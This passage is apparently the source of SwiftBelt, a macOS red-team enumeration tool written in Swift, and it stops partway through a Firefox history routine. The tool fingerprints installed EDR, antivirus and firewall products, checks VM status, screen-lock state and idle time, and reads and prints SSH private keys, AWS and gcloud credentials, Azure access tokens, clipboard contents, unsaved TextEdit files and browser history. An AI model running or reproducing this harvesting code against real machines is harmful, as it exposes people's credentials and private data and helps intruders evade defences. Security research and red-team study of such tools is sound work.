import Cocoa
import Foundation
import OSAKit
import Darwin
import OpenDirectory
import SQLite3

let binname = CommandLine.arguments[0]
let fileMan = FileManager.default
var isDir = ObjCBool(true)

let black = "\u{001B}[0;30m"
let red = "\u{001B}[0;31m"
let green = "\u{001B}[0;32m"
let yellow = "\u{001B}[0;33m"
let blue = "\u{001B}[0;34m"
let magenta = "\u{001B}[0;35m"
let cyan = "\u{001B}[0;36m"
let white = "\u{001B}[0;37m"
let colorend = "\u{001B}[0;0m"
var hiddenString = ""
var nm1 = ""
var nm2 = ""
var nm3 = ""
var nm4 = ""

func Banner(){
    print("\(cyan)++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\(colorend)")
    print("\(yellow) _______  _     _  ___   _______  _______  _______  _______  ___      _______")
    print("|       || | _ | ||   | |       ||       ||  _    ||       ||   |    |       |")
    print("|  _____|| || || ||   | |    ___||_     _|| |_|   ||    ___||   |    |_     _|")
    print("| |_____ |       ||   | |   |___   |   |  |       ||   |___ |   |      |   |")
    print("|_____  ||       ||   | |    ___|  |   |  |  _   | |    ___||   |___   |   |")
    print(" _____| ||   _   ||   | |   |      |   |  | |_|   ||   |___ |       |  |   |")
    print("|_______||__| |__||___| |___|      |___|  |_______||_______||_______|  |___|\(colorend)")
    print("")
    print("SwiftBelt: A MacOS enumerator similar to @harmjoy's Seatbelt. Does not use any command line utilities")
    print("author: @cedowens")
    print("\(cyan)++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\(colorend)")
    print("")
}

func SecCheck(){
    
    print("\(yellow)##########################################\(colorend)")
    print("==> Security Tools Found:")
    do {
        let myWorkspace = NSWorkspace.shared
        let processes = myWorkspace.runningApplications
        var procList = [String]()
        for i in processes {
            let str1 = "\(i)"
            procList.append(str1)
        }
        let processes2 = procList.joined(separator: ", ")
        var b = 0
        
        if processes2.contains("CbOsxSensorService") || fileMan.fileExists(atPath: "/Applications/CarbonBlack/CbOsxSensorService"){
            print("\(green)[+] Carbon Black OSX Sensor installed.\(colorend)")
            b = 1
        }
        if processes2.contains("CbDefense") || fileMan.fileExists(atPath: "/Applications/Confer.app",isDirectory: &isDir){
            print("\(green)[+] Carbon Black Defense A/V installed\(colorend)")
            b = 1
        }
        if processes2.contains("ESET") || processes2.contains("eset") || fileMan.fileExists(atPath: "Library/Application Support/com.eset.remoteadministrator.agent",isDirectory: &isDir){
            print("\(green)[+] ESET A/V installed\(colorend)")
            b = 1
        }
        if processes2.contains("Littlesnitch") || processes2.contains("Snitch") || fileMan.fileExists(atPath: "/Library/Little Snitch/", isDirectory: &isDir) {
            print("\(green)[+] Little snitch firewall found\(colorend)")
            b = 1
        }
        if processes2.contains("xagt") || fileMan.fileExists(atPath: "/Library/FireEye/xagt",isDirectory: &isDir) {
            print("\(green)[+] FireEye HX agent installed\(colorend)")
            b = 1
        }
        if processes2.contains("falcond") || fileMan.fileExists(atPath: "/Library/CS/falcond") || fileMan.fileExists(atPath: "/Applications/Falcon.app/Contents/Resources",isDirectory: &isDir) {
            print("\(green)[+] Crowdstrike Falcon agent found\(colorend)")
            b = 1
        }
        if processes2.contains("OpenDNS") || processes2.contains("opendns") || fileMan.fileExists(atPath: "/Library/Application Support/OpenDNS Roaming Client/dns-updater") {
            print("\(green)[+] OpenDNS Client running\(colorend)")
            b = 1
        }
        if processes2.contains("SentinelOne") || processes2.contains("sentinelone"){
            print("\(green)[+] SentinelOne agent running\(colorend)")
            b = 1
        }
        if processes2.contains("GlobalProtect") || processes2.contains("/PanGPS") || fileMan.fileExists(atPath: "/Library/Logs/PaloAltoNetworks/GlobalProtect",isDirectory: &isDir) || fileMan.fileExists(atPath: "/Library/PaloAltoNetworks",isDirectory: &isDir){
            print("\(green)[+] Global Protect PAN VPN client running\(colorend)")
            b = 1
        }
        if processes2.contains("HostChecker") || processes2.contains("pulsesecure") || fileMan.fileExists(atPath: "/Applications/Pulse Secure.app",isDirectory: &isDir) || processes2.contains("Pulse-Secure"){
            print("\(green)[+] Pulse VPN client running\(colorend)")
            b = 1
        }
        if processes2.contains("AMP-for-Endpoints") || fileMan.fileExists(atPath: "/opt/cisco/amp",isDirectory: &isDir){
            print("\(green)[+] Cisco AMP for endpoints found\(colorend)")
            b = 1
        }
        if fileMan.fileExists(atPath: "/usr/local/bin/jamf") || fileMan.fileExists(atPath: "/usr/local/jamf"){
            print("\(green)[+] JAMF found on this host\(colorend)")
            b = 1
        }
        if fileMan.fileExists(atPath: "/Library/Application Support/Malwarebytes",isDirectory: &isDir){
            print("\(green)[+] Malwarebytes A/V found on this host\(colorend)")
            b = 1
        }
        if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
            print("\(green)[+] osqueryi found\(colorend)")
            b = 1
        }
        if fileMan.fileExists(atPath: "/Library/Sophos Anti-Virus/",isDirectory: &isDir){
            print("\(green)[+] Sophos antivirus found\(colorend)")
            b = 1
        }
        if processes2.contains("lulu") || fileMan.fileExists(atPath: "/Library/Objective-See/Lulu",isDirectory: &isDir) || fileMan.fileExists(atPath: "/Applications/LuLu.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See LuLu firewall found\(colorend)")
            b = 1
        }
        if processes2.contains("dnd") || fileMan.fileExists(atPath: "/Library/Objective-See/DND",isDirectory: &isDir) || fileMan.fileExists(atPath: "/Applications/Do Not Disturb.app/",isDirectory: &isDir) {
            print("\(green)[+] Objective-See Do Not Disturb, physical access detection tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("WhatsYourSign") || fileMan.fileExists(atPath: "/Applications/WhatsYourSign.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See Whats Your Sign, code signature information tool, found\(colorend)")
            b = 1
        }
        // Knock Knock
        if processes2.contains("KnockKnock") || fileMan.fileExists(atPath: "/Applications/KnockKnock.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See Knock Knock, persistent software detection tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("reikey") || fileMan.fileExists(atPath: "/Applications/ReiKey.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See ReiKey, keyboard event taps detection tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("OverSight") || fileMan.fileExists(atPath: "/Applications/OverSight.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See Over Sight, microphone and camera monitor tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("KextViewr") || fileMan.fileExists(atPath: "/Applications/KextViewr.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See KextViewr, kernel module detection tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("blockblock") || fileMan.fileExists(atPath: "/Applications/BlockBlock Helper.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See Block Block, persistent location monitoring tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("Netiquette") || fileMan.fileExists(atPath: "/Applications/Netiquette.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See Netiquette, network monitoring tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("processmonitor") || fileMan.fileExists(atPath: "/Applications/ProcessMonitor.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See ProcessMonitor, process monitoring tool, found\(colorend)")
            b = 1
        }
        if processes2.contains("filemonitor") || fileMan.fileExists(atPath: "/Applications/FileMonitor.app",isDirectory: &isDir) {
            print("\(green)[+] Objective-See FileMonitor, file monitoring tool, found\(colorend)")
            b = 1
        }
        
        if b == 0{
            print("[-] No security products found.")
        }
        
    } catch {
        print("\(red)[-] Error listing running applications\(colorend)")
    }
    
    print("\(yellow)##########################################\(colorend)")
    
}


func getaddy() -> [String]{
    //getaddy function code lifted from https://stackoverflow.com/questions/25626117/how-to-get-ip-addresses-in-swift/25627545
    var addresses = [String]()
    
    var ifaddr : UnsafeMutablePointer<ifaddrs>?
    guard getifaddrs(&ifaddr) == 0 else { return [] }
    guard let firstAddr = ifaddr else { return [] }
    
    for ptr in sequence(first: firstAddr, next: { $0.pointee.ifa_next}) {
        let flags = Int32(ptr.pointee.ifa_flags)
        let addr = ptr.pointee.ifa_addr.pointee
        
        if (flags & (IFF_UP|IFF_RUNNING|IFF_LOOPBACK)) == (IFF_UP|IFF_RUNNING) {
            if addr.sa_family == UInt8(AF_INET) || addr.sa_family == UInt8(AF_INET6) {
                var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                if (getnameinfo(ptr.pointee.ifa_addr, socklen_t(addr.sa_len), &hostname, socklen_t(hostname.count),nil, socklen_t(0), NI_NUMERICHOST) == 0) {
                    let address = String(cString: hostname)
                    addresses.append(address)
                }
            }
        }
    }
    freeifaddrs(ifaddr)
    return addresses
}

func SystemInfo(){
    if let var1 = ProcessInfo.processInfo.environment["__CFBundleIdentifier"]{
        if !("\(var1)".contains("0")){
            print("==> Current process context:\(green)")
            print(var1 + "\(colorend)")
            
        }
        
    }
    
    if let var2 = ProcessInfo.processInfo.environment["XPC_SERVICE_NAME"]{
        if !("\(var2)".contains("0")){
            print("==> Current process context:\(green)")
            print(var2 + "\(colorend)")
            
        }
        
    }
    if let var3 = ProcessInfo.processInfo.environment["PACKAGE_PATH"]{
        if !("\(var3)".contains("0")){
            print("==> Current process context:\(green)")
            print(var3 + "\(colorend)")
            
        }
      
    }
    
    var aCheck = AXIsProcessTrusted()
    print("==> Accessibility TCC Check:")
    if aCheck{
        print("\(green)[+] Your current app context DOES have Accessibility TCC permissions!\(colorend)")
    }
    else {
        print("\(red)[-] Your current app context does NOT have Accessibility TCC permissions!\(colorend)")
        
    }
    
    var size = 0
    let mach2 = "hw.model".cString(using: .utf8)
    sysctlbyname(mach2, nil, &size, nil, 0)
    var machine2 = [CChar](repeating: 0, count: Int(size))
    sysctlbyname(mach2, &machine2, &size, nil, 0)
    let hwmodel = String(cString: machine2)
    print("==> Hardware Model: \(green)" + String(cString: machine2) + "\(colorend)")

    if !(hwmodel.contains("Mac")){
        print("\(red)[-] Host IS running in a VM based on the hardware model value of \(hwmodel)\(colorend)")
    }
    else {
        print("\(green)[+] Host is a physical machine and is not in a VM based on the hardware model value of \(hwmodel)\(colorend)")
    }
    
    var boottime = timeval()
    var sz = MemoryLayout<timeval>.size
    sysctlbyname("kern.boottime", &boottime, &sz, nil, 0)
    let dt = Date(timeIntervalSince1970: Double(boottime.tv_sec) + Double(boottime.tv_usec)/1_000_000.0)
    print("==> Last boot time: \(green)\(dt)\(colorend)")
    
    let mach4 = "kern.version".cString(using: .utf8)
    sysctlbyname(mach4, nil, &size, nil, 0)
    var machine4 = [CChar](repeating: 0, count: Int(size))
    sysctlbyname(mach4, &machine4, &size, nil, 0)
    print("==> Kernel Info: \(green)" + String(cString: machine4) + "\(colorend)")
    
    let dev2 = IOServiceMatching("IOHIDSystem")
    let usbinfo1 : io_service_t = IOServiceGetMatchingService(kIOMasterPortDefault, dev2)
    let usbInfoAsString = IORegistryEntryCreateCFProperty(usbinfo1, kIOHIDIdleTimeKey as CFString, kCFAllocatorDefault, 0)
    IOObjectRelease(usbinfo1)
    let usbinfo2: CFTypeRef = usbInfoAsString!.takeUnretainedValue()
    let idleTime = Int("\(usbinfo2)")
    let idleTime2 = idleTime!/1000000000
    print("==> Idle Time (no keyboard/mouse interaction) in seconds: \(green)\(idleTime2)\(colorend)")
    
    let cgdict = CGSessionCopyCurrentDictionary()!

    let dict = cgdict as? [String: AnyObject]
    if dict!["CGSSessionScreenIsLocked"] != nil {
        print("\(green)[+] The screen IS currently locked!\(colorend)")
    }
    else {
        print("[-] The screen is \(red)NOT\(colorend) currently locked!")
    }
    
    
    
    let myScript = "return (system info)"
    let k = OSAScript.init(source: myScript)
    var compileErr : NSDictionary?
    k.compileAndReturnError(&compileErr)
    var scriptErr : NSDictionary?
    let myresult = k.executeAndReturnError(&scriptErr)!
    let result = "\(myresult)".replacingOccurrences(of: "'utxt'", with: "").replacingOccurrences(of: "'siav'", with: "AppleScript version").replacingOccurrences(of: "(", with: "").replacingOccurrences(of: ")", with: "").replacingOccurrences(of: "sikv", with: "AppleScript Studio version").replacingOccurrences(of: "sisn", with: "Short User Name").replacingOccurrences(of: "siln", with: "Long User Name").replacingOccurrences(of: "siid", with: "user ID").replacingOccurrences(of: "siul", with: "User Locale").replacingOccurrences(of: "home", with: "Home Directory").replacingOccurrences(of: "file://", with: "").replacingOccurrences(of: "'alis'", with: "").replacingOccurrences(of: "sibv", with: "").replacingOccurrences(of: "sicn", with: "Computer Name").replacingOccurrences(of: "ldsa", with: "Host Name").replacingOccurrences(of: "siip", with: "IP Address").replacingOccurrences(of: "siea", with: "Primary Ethernet Address").replacingOccurrences(of: "sict", with: "CPU Type").replacingOccurrences(of: "sics", with: "CPU Speed").replacingOccurrences(of: "sipm", with: "Memory").replacingOccurrences(of: "<NSAppleEventDescriptor: {", with: "").replacingOccurrences(of: "}>", with: "").replacingOccurrences(of: ", ", with: "\n").replacingOccurrences(of: "'':\"Macintosh HD:\"", with: "").replacingOccurrences(of: "sisv", with: "OS Version")
    print("\(yellow)##########################################\(colorend)")
    print("==> System Info:\(green)")
    
    print(result)
    let mySess = ODSession.default()
    do {
        let x = try mySess!.nodeNames()
        var y = [String]()
        for each in x{
            y.append("\(each)")
        }
        var c = 0
        for item in y{
            if item.contains("AD") || item.contains("Active Directory"){
                print("\(green)[+] Host is likely joined to AD\(colorend)")
                c = 1
            }
        }
        
        if c == 0{
            if fileMan.fileExists(atPath: "/Applications/NoMAD.app",isDirectory: &isDir){
                print("\(green)\n[+] NoMAD found so host is likely joined to AD\(colorend)")
            }
            else {
                print("\(red)[-] No direct AD binding found on this host\(colorend)")
            }
        }
        print("")
        print("\(green)Open Directory Nodes Found On This Host:\(colorend)")
        for d in x{
            print(d)
        }
    } catch {
        print("\(red)[-] Error checking Open Directory Nodes.\(colorend)")
    }
    print("")
    
    var plistFormat = PropertyListSerialization.PropertyListFormat.xml
    var pListData : [String: AnyObject] = [:]
    let pListPath : String? = Bundle.main.path(forResource: "data", ofType: "plist")
    
    
    if fileMan.fileExists(atPath: "/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist"){
        let plistURL = URL(fileURLWithPath: "/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist")
        do {
            let plistXML = try Data(contentsOf: plistURL)
            pListData = try PropertyListSerialization.propertyList(from:plistXML, options: .mutableContainersAndLeaves, format: &plistFormat) as! [String:AnyObject]
            
            for each in pListData{
                if each.key == "KnownNetworks"{
                    print("\(green)Wifi SSID found:\(colorend)")
                    print("\(each.value)")
                        
                    }
            
                }
            
            } catch {
                print("\(red)[-] Error reading the com.appleairport.preferences.plist file\(colorend)")
            }
            
        }
    
    print("")
    print("Internal IP Addresses:\(green)")
    let internalAddys = getaddy()
    for ip in internalAddys{
        print(ip)
    }
    
    print("")
    print("\(colorend)Environment variable info:\(green)")
    let v = ProcessInfo.processInfo.environment
    for x in v{
        print(x)
    }
    
    print("")
    
    print("\(colorend)\(yellow)##########################################\(colorend)")
}

func TextEditCheck(){
    let username = NSUserName()
    let path = "/Users/\(username)/Library/Containers/com.apple.TextEdit/Data/Library/Autosave Information"
    var dir = ObjCBool(true)
    var tcanary = 0
    
    if fileMan.fileExists(atPath: path, isDirectory: &dir){
        print("\n==> TextEdit autosave temp dir found...checking for unsaved TextEdit documents...")
        do {
            var tempDirContents = try fileMan.contentsOfDirectory(atPath: path)
            if tempDirContents.count > 1 {
                    for file in tempDirContents{
                        if file.hasSuffix(".rtf"){
                            tcanary = tcanary + 1
                            var filecontents = try String(contentsOfFile: "/Users/\(username)/Library/Containers/com.apple.TextEdit/Data/Library/Autosave Information/\(file)")
                            print("Unsaved TextEdit file contents:")
                            print("\(green)\(filecontents)\(colorend)")
                        }
                    }
            }
            
            if tcanary == 0 {
                print("\(yellow)[-] No unsaved TextEdit documents found...\(colorend)")
            }
            
        }
        catch (let error){
            print("\(red)\(error)\(colorend)")
            
        }

    
        
    }
}

func LockCheck(){
    let cgdict = CGSessionCopyCurrentDictionary()!

    let dict = cgdict as? [String: AnyObject]
    if dict!["CGSSessionScreenIsLocked"] != nil {
        print("\(green)[+] The screen IS currently locked!\(colorend)")
    }
    else {
        print("[-] The screen is \(red)NOT\(colorend) currently locked!")
    }
    
    print("\(colorend)\(yellow)##########################################\(colorend)")
}

func SearchCreds() {
    print("\(colorend)SSH/AWS/gcloud Credentials Search:\(green)")
    let uName = NSUserName()
    if fileMan.fileExists(atPath: "/Users/\(uName)/.ssh",isDirectory: &isDir){
        print("\(colorend)==>SSH Key Info Found:\(green)")
        let enumerator = fileMan.enumerator(atPath: "/Users/\(uName)/.ssh")
        while let each = enumerator?.nextObject() as? String {
            do {
                print("\(colorend)\(each):\(green)")
                let fileData = "/Users/\(uName)/.ssh/\(each)"
                let fileData2 = try String(contentsOfFile: fileData)
                if fileData2 != nil {
                    print(fileData2)
                }
                
            } catch {
                print("\(red)[-] Error attempting to get file contents for /Users/\(uName)/.ssh/\(each)\(colorend)\n")
            }
        
        }
        
    } else {
        print("\(red)[-] ~/.ssh directory not found on this host\(colorend)")
    }
    
    print("")
    
    if fileMan.fileExists(atPath: "/Users/\(uName)/.aws",isDirectory: &isDir){
        print("\(colorend)==>AWS Info Found:\(green)")
        let enumerator = fileMan.enumerator(atPath: "/Users/\(uName)/.aws")
        while let each = enumerator?.nextObject() as? String {
            do {
                print("\(colorend)\(each):\(green)")
                let fileData = "/Users/\(uName)/.aws/\(each)"
                let fileData2 = try String(contentsOfFile: fileData)
                if fileData2 != nil {
                    print(fileData2)
                }
                
            } catch {
                print("\(red)[-] Error attempting to get file contents for /Users/\(uName)/.aws/\(each)\(colorend)\n")
            }
        }
    } else {
        print("\(red)[-] ~/.aws directory not found on this host\(colorend)")
    }
    
    print("")
    
    if fileMan.fileExists(atPath: "/Users/\(uName)/.config/gcloud/credentials.db"){
        do {
            print("\(colorend)==>GCP gcloud Info Found:\(green)")
            var db : OpaquePointer?
            var dbURL = URL(fileURLWithPath: "/Users/\(uName)/.config/gcloud/credentials.db")
            if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
                print("\(red)[-] Could not open the gcloud credentials database\(colorend)")
            } else {
                let queryString = "select * from credentials;"
                var queryStatement: OpaquePointer? = nil
                if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                    while sqlite3_step(queryStatement) == SQLITE_ROW{
                        let col1 = sqlite3_column_text(queryStatement, 0)
                        if col1 != nil{
                            nm1 = String(cString: col1!)
                        }
                        let col2 = sqlite3_column_text(queryStatement, 1)
                        if col2 != nil{
                            nm2 = String(cString: col2!)
                        }
                        print("account_id: \(nm1)  |  value: \(nm2)")
                    }
                    sqlite3_finalize(queryStatement)
                }
            }
            
        }
        catch {
            print("\(red)[-] Error attempting to get contents of ~/.config/gcloud/credentials.db\(colorend)")
        }
        
    } else {
        print("\(red)[-] ~/.config/gcloud/credentials.db not found on this host\(colorend)")
    }
    
    print("")

    if fileMan.fileExists(atPath: "/Users/\(uName)/.azure",isDirectory: &isDir){
        print("\(colorend)==>Azure Info Found:\(green)")

        let azureProfilePath = "/Users/\(uName)/.azure/azureProfile.json"
        do {
            let azureProfileContents = try String(contentsOfFile: azureProfilePath)

            print(azureProfilePath)
            print(azureProfileContents)
            print("")
        } catch {
            print("\(red)[-] Error attempting to get file contents for \(azureProfilePath)\(colorend)\n")
        }

        let azureTokensPath = "/Users/\(uName)/.azure/accessTokens.json"
        do {
            let azureTokensContents = try String(contentsOfFile: azureTokensPath)

            print(azureTokensPath)
            print(azureTokensContents)
        } catch {
            print("\(red)[-] Error attempting to get file contents for \(azureTokensPath)\(colorend)\n")
        }
    } else {
        print("\(red)[-] ~/.azure directory not found on this host\(colorend)")
    }
    
    print("\(colorend)\(yellow)##########################################\(colorend)")
    
}

func Clipboard(){
    let clipBoard = NSPasteboard.general
    var clipArray = [String]()
    
    for each in clipBoard.pasteboardItems! {
        if let str = each.string(forType: NSPasteboard.PasteboardType(rawValue: "public.utf8-plain-text")){
            clipArray.append(str)
        }
    }
    
    let joined = clipArray.joined(separator: ", ")
    
    print("\(yellow)##########################################\(colorend)")
    print("==> Clipboard Info:\(green)")
    print(joined)
//    print(myresult2)
    print("\(colorend)\(yellow)##########################################\(colorend)\(colorend)")
    
}

func RunningApps(){
    let myWorkSpace = NSWorkspace.shared
    let appCount = myWorkSpace.runningApplications.count
    
    print("\(yellow)##########################################\(colorend)")
    print("==>Count of Running Apps: \(appCount)")

    var count = 0
    for each in NSWorkspace.shared.runningApplications {
        count = count + 1
        let appName = each.localizedName!
        let appURL = each.bundleURL//!
        let launchDate = each.launchDate
        let pid = each.processIdentifier
        
        if each.isHidden == true {
            hiddenString = "Hidden: YES\r"
        }
        else {
            hiddenString = "Hidden: NO\r"
        }
        print("\(count). Name: \(appName)")
        
        if appURL != nil {
            print("===>\(green)Path: \(appURL)\(colorend)")
        }
        
        if launchDate != nil {
            var lString = "\(launchDate)"
            var lString2 = lString.replacingOccurrences(of: "Optional", with: "").replacingOccurrences(of: "(", with: "").replacingOccurrences(of: ")", with: "")
            print("===>\(green)Launch Date: \(lString2)\(colorend)")
                
        }
        
        
        if pid != nil {
            var pString = "\(pid)"
            var pString2 = pString.replacingOccurrences(of: "Optional", with: "").replacingOccurrences(of: "(", with: "").replacingOccurrences(of: ")", with: "")
            print("===>\(green)PID: \(pString2)\(colorend)")
            
        }

        print("\(hiddenString)")
}
    print("\(yellow)##########################################\(colorend)")
}

func ListUsers(){
    let userDir = "/Users/"
    do {
        print("\(yellow)##########################################\(colorend)")
        print("==>Local User Account Info:\(green)")
        let users = try fileMan.contentsOfDirectory(atPath: userDir)
        for user in users{
            print(user)
        }
        print("\(colorend)\(yellow)##########################################\(colorend)")
    } catch {
        print("\(yellow)##########################################\(colorend)")
        print("\(red)[-] Error attempting to list users\(colorend)")
        print("\(yellow)##########################################\(colorend)")
    }
    
    
    
}

func LaunchAgents(){
    print("\(yellow)##########################################\(colorend)")
    print("==>LaunchAgent/LaunchDaemon Info:")
    let uName = NSUserName()
    
    if fileMan.fileExists(atPath: "/Users/\(uName)/Library/LaunchAgents",isDirectory: &isDir){
        let launchaURL = URL(fileURLWithPath: "/Users/\(uName)/Library/LaunchAgents")
        print("\(colorend)User LaunchAgent Info:\(green)")
        do {
            let fileURLs = try fileMan.contentsOfDirectory(at: launchaURL, includingPropertiesForKeys: nil)
            for file in fileURLs{
                print(file)
            }
        } catch {
            print("\(colorend)\(red)[-] Error while listing user LaunchAgent files\(colorend)")
            
        }
        
        print("")
        
    }
    
    if fileMan.fileExists(atPath: "/Library/LaunchDaemons",isDirectory: &isDir){
        let launchdURL = URL(fileURLWithPath: "/Library/LaunchDaemons")
        print("\(colorend)System LaunchDaemon Info:\(green)")
        do {
            let fileURLs = try fileMan.contentsOfDirectory(at: launchdURL, includingPropertiesForKeys: nil)
            for file in fileURLs{
                
                print(file)
            }
        } catch {
            print("\(colorend)\(red)[-] Error while listing System LaunchDaemon files\(colorend)")
        }
        
        print("")
        
    }
    
    if fileMan.fileExists(atPath: "/Library/LaunchAgents",isDirectory: &isDir){
        let launchaURL2 = URL(fileURLWithPath: "/Library/LaunchAgents")
        print("\(colorend)System LaunchAgent Info:\(green)")
        do {
            let fileURLs = try fileMan.contentsOfDirectory(at: launchaURL2, includingPropertiesForKeys: nil)
            for file in fileURLs{
                
                print(file)
            }
        } catch {
            print("\(colorend)\(red)[-] Error while listing System LaunchAgent files\(colorend)")
        }
        
        print("")
        
    }
    
    if fileMan.fileExists(atPath: "/Library/Managed Preferences",isDirectory: &isDir){
        let launchaURL4 = URL(fileURLWithPath: "/Library/Managed Preferences/")
        print("\(colorend)Configuration Profile Info:\(green)")
        do {
            let fileURLs = try fileMan.contentsOfDirectory(at: launchaURL4, includingPropertiesForKeys: nil)
            for file in fileURLs{
                
                print(file)
            }
        } catch {
            print("\(colorend)\(red)[-] Error while listing Configuration Profile files\(colorend)")
        }

        
    }
  
    print("\(colorend)\(yellow)##########################################\(colorend)")
}

func BrowserHistory(){
    print("\(colorend)\(yellow)##########################################\(colorend)")
    print("==>Browser History Info:")
    let fileMan = FileManager()
    var nm1 = ""
    var nm2 = ""
    var nm3 = ""
    var nm4 = ""
    var visitDate = ""
    var histURL = ""
    var cVisitDate = ""
    var cUrl = ""
    var cTitle = ""
    var ffoxDate = ""
    var ffoxURL = ""

    var isDir = ObjCBool(true)
    let username = NSUserName()

    //quarantine history
    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2", isDirectory: &isDir){
        print("")
        print("\(green)***************Quarantine History Results for user \(username)***************\(colorend)")
                    var db : OpaquePointer?
                    var dbURL = URL(fileURLWithPath: "/Users/\(username)/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2")
                    if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
                        print("\(red)[-] Could not open quarantive events database.\(colorend)")
                    }else {
                        
                        let queryString = "select datetime(LSQuarantineTimeStamp, 'unixepoch') as last_visited, LSQuarantineAgentBundleIdentifier, LSQuarantineDataURLString, LSQuarantineOriginURLString from LSQuarantineEvent where LSQuarantineDataURLString is not null order by last_visited;"

                        var queryStatement: OpaquePointer? = nil
                        
                        if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                            while sqlite3_step(queryStatement) == SQLITE_ROW {
                                let col1 = sqlite3_column_text(queryStatement, 0)
                                if col1 != nil{
                                    nm1 = String(cString: col1!)
                                    
                                }

                                let col2 = sqlite3_column_text(queryStatement, 1)
                                if col2 != nil{
                                    nm2 = String(cString: col2!)
                                }
                                
                                let col3 = sqlite3_column_text(queryStatement, 2)
                                if col3 != nil{
                                    nm3 = String(cString:col3!)
                                }
                                
                                
                                let col4 = sqlite3_column_text(queryStatement, 3)
                                if col4 != nil{
                                    nm4 = String(cString: col4!)
                                }
                                
                                
                                print("Date: \(nm1) | App: \(nm2) | File: \(nm3) | OriginURL: \(nm4)")

                            }
        //
                            sqlite3_finalize(queryStatement)
                            
                        }
                        
                        
                        
                    }
        
    }else {
        print("\(red)[-] QuarantineEventsV2 database not found for user \(username)\(colorend)")
    }

    //safari history check
    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Safari/History.db", isDirectory: &isDir){
        print("")
        print("\(green)***************Safari history results for user \(username)***************\(colorend)")
        var db : OpaquePointer?
        var dbURL = URL(fileURLWithPath: "/Users/\(username)/Library/Safari/History.db")
        if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
            print("\(red)[-] Could not open the Safari History.db file for user \(username)\(colorend). It may be locked due to current use but you can copy it elsewhere and read from it")
        }else {
            //let queryString = "select history_visits.visit_time, history_items.url from history_visits, history_items where history_visits.history_item=history_items.id;"
            let queryString = "select datetime(history_visits.visit_time + 978307200, 'unixepoch') as last_visited, history_items.url from history_visits, history_items where history_visits.history_item=history_items.id order by last_visited;"
            var queryStatement: OpaquePointer? = nil
            
            if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                while sqlite3_step(queryStatement) == SQLITE_ROW{
                    let col1 = sqlite3_column_text(queryStatement, 0)
                    if col1 != nil{
                        visitDate = String(cString: col1!)
                        
                    }
                    let col2 = sqlite3_column_text(queryStatement, 1)
                    if col2 != nil{
                        histURL = String(cString: col2!)
                        
                    }
                    
                    print("Date: \(visitDate) | URL: \(histURL)")
                    
                }
                sqlite3_finalize(queryStatement)
                
            }
            
        }
    }
    else {
        print("\(red)[-] Safari History.db database not found for user \(username)\(colorend)")
    }

    //chrome history check
    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Application Support/Google/Chrome/Default/History", isDirectory: &isDir){
        print("")
        print("\(green)***************Chrome history results for user \(username)***************\(colorend)")
        var db : OpaquePointer?
        var dbURL = URL(fileURLWithPath: "/Users/\(username)/Library/Application Support/Google/Chrome/Default/History")
        
        if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
            print("\(red)[-] Could not open the Chrome history database file for user \(username)\(colorend)")
            
        } else{
            
            let queryString = "select datetime(last_visit_time/1000000-11644473600, \"unixepoch\") as last_visited, url, title from urls order by last_visited;"
            
            var queryStatement: OpaquePointer? = nil
            
            if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                
                while sqlite3_step(queryStatement) == SQLITE_ROW{
                    
                    
                    let col1 = sqlite3_column_text(queryStatement, 0)
                    if col1 != nil{
                        cVisitDate = String(cString: col1!)
                        
                    }
                    
                    let col2 = sqlite3_column_text(queryStatement, 1)
                    if col2 != nil{
                        cUrl = String(cString: col2!)
                        
                    }
                    
                    let col3 = sqlite3_column_text(queryStatement, 2)
                    if col3 != nil{
                        cTitle = String(cString: col3!)
                        
                    }
                    
                    
                     print("Date: \(cVisitDate) | URL: \(cUrl) | Title: \(cTitle)")
                    
                }
                
                sqlite3_finalize(queryStatement)
                
            }
            else {
                print("\(red)[-] Issue with preparing the Chrome History database...this may be because something is currently writing to it (i.e., an active Chrome browser). You can simply copy the locked file elsewhere and read from there\(colorend)")
            }
            
        }
    }
    else{
        print("\(red)[-] Chrome History database not found for user \(username)\(colorend)")
    }
        
    //firefox history check
    if fileMan.fileExists(atPath: "/Users/\(username)/Library/Application Support/Firefox/Profiles/"){
        let fileEnum = fileMan.enumerator(atPath: "/Users/\(username)/Library/Application Support/Firefox/Profiles/")
        print("")
        print("\(green)***************Firefox history results for user \(username)***************\(colorend)")
        
        while let each = fileEnum?.nextObject() as? String {
            if each.contains("places.sqlite"){
                let placesDBPath = "/Users/\(username)/Library/Application Support/Firefox/Profiles/\(each)"
                var db : OpaquePointer?
                var dbURL = URL(fileURLWithPath: placesDBPath)
                
                var printTest = sqlite3_open(dbURL.path, &db)
